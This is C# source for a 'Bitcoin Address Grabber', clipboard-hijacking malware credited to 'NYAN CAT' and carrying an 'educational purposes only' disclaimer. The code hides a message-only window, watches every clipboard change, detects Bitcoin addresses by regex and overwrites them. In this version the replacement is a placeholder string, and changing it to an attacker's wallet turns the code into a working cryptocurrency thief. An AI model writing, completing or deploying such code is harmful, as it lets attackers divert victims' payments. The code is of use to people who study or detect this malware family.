using System;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text.RegularExpressions;
/*
 * │ Author       : NYAN CAT
 * │ Name         : Bitcoin Address Grabber v0.2
 * │ Contact      : https:github.com/NYAN-x-CAT
 * 
 * This program Is distributed for educational purposes only.
 */

namespace Bitcoin_Grabber
{
    public class Program
    {
        public static void Main()
        {
            new Thread(() => { Application.Run(new ClipboardNotification.NotificationForm()); }).Start();
        }
    }

    internal static class NativeMethods
    {
        //https://stackoverflow.com/questions/17762037/error-while-trying-to-copy-string-to-clipboard
        //https://gist.github.com/glombard/7986317

        public const int WM_CLIPBOARDUPDATE = 0x031D;
        public static IntPtr HWND_MESSAGE = new IntPtr(-3);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AddClipboardFormatListener(IntPtr hwnd);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
    }

    public static class Clipboard
    {
        public static string GetText()
        {
            string ReturnValue = string.Empty;
            Thread STAThread = new Thread(
                delegate ()
                {
                    ReturnValue = System.Windows.Forms.Clipboard.GetText();
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();

            return ReturnValue;
        }

        public static void SetText(string txt)
        {
            Thread STAThread = new Thread(
                delegate ()
                {
                    System.Windows.Forms.Clipboard.SetText(txt);
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();
        }
    }

    public sealed class ClipboardNotification
    {
        public class NotificationForm : Form
        {
            public NotificationForm()
            {
                NativeMethods.SetParent(Handle, NativeMethods.HWND_MESSAGE);
                NativeMethods.AddClipboardFormatListener(Handle);
            }

            protected override void WndProc(ref Message m)
            {
                if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
                {

                    /* the address always starts with 1 or 3 or bc1
                     * the length is between 26-35 characters
                     * more info https://en.bitcoin.it/wiki/Address
                     */

                    string input = Clipboard.GetText();
                    string pattern = @"(?:\s|^)(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}(?:\s|$)";
                    string replacement = "<<! Bitcoin Grabber By NYAN CAT !>>";

                    Regex rgx = new Regex(pattern);
                    Match match = rgx.Match(input);
                    if (match.Success)
                    {
                        string result = rgx.Replace(input, replacement);
                        Clipboard.SetText(result);
                    }
                }
                base.WndProc(ref m);
            }
        }

    }
}